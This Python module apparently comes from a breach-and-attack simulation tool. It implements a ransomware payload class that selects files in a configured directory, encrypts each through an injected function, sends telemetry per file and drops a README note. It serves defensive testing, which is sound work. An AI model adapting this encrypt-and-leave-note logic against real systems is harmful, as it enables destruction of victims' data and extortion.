import logging
from pathlib import Path
from typing import Callable, List

from infection_monkey.ransomware.consts import README_FILE_NAME, README_SRC
from infection_monkey.ransomware.ransomware_config import RansomwareConfig
from infection_monkey.telemetry.file_encryption_telem import FileEncryptionTelem
from infection_monkey.telemetry.messengers.i_telemetry_messenger import ITelemetryMessenger

logger = logging.getLogger(__name__)


class RansomwarePayload:
    def __init__(
        self,
        config: RansomwareConfig,
        encrypt_file: Callable[[Path], None],
        select_files: Callable[[Path], List[Path]],
        leave_readme: Callable[[Path, Path], None],
        telemetry_messenger: ITelemetryMessenger,
    ):
        self._config = config

        self._encrypt_file = encrypt_file
        self._select_files = select_files
        self._leave_readme = leave_readme
        self._telemetry_messenger = telemetry_messenger

        self._target_directory = self._config.target_directory
        self._readme_file_path = (
            self._target_directory / README_FILE_NAME if self._target_directory else None
        )
        self._readme_incomplete = False

    def run_payload(self):
        if not self._target_directory:
            return

        logger.info("Running ransomware payload")

        if self._config.encryption_enabled:
            file_list = self._find_files()
            self._encrypt_files(file_list)

        if self._config.readme_enabled:
            self._leave_readme_in_target_directory()

    def _find_files(self) -> List[Path]:
        logger.info(f"Collecting files in {self._target_directory}")
        return sorted(self._select_files(self._target_directory))

    def _encrypt_files(self, file_list: List[Path]):
        logger.info(f"Encrypting files in {self._target_directory}")

        for filepath in file_list:
            try:
                logger.debug(f"Encrypting {filepath}")
                self._encrypt_file(filepath)
                self._send_telemetry(filepath, True, "")
            except Exception as ex:
                logger.warning(f"Error encrypting {filepath}: {ex}")
                self._send_telemetry(filepath, False, str(ex))

    def _send_telemetry(self, filepath: Path, success: bool, error: str):
        encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
        self._telemetry_messenger.send_telemetry(encryption_attempt)

    def _leave_readme_in_target_directory(self):
        try:
            self._readme_incomplete = True
            self._leave_readme(README_SRC, self._readme_file_path)
            self._readme_incomplete = False
        except Exception as ex:
            logger.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")

    def cleanup(self):
        if self._readme_incomplete:
            logger.info(
                "README.txt file dropping was interrupted. Removing corrupt file and "
                "trying again."
            )
            try:
                self._readme_file_path.unlink()
                self._leave_readme_in_target_directory()
            except Exception as ex:
                logger.info(
                    f"An exception occurred: {str(ex)}. README.txt file dropping was "
                    "unsuccessful."
                )
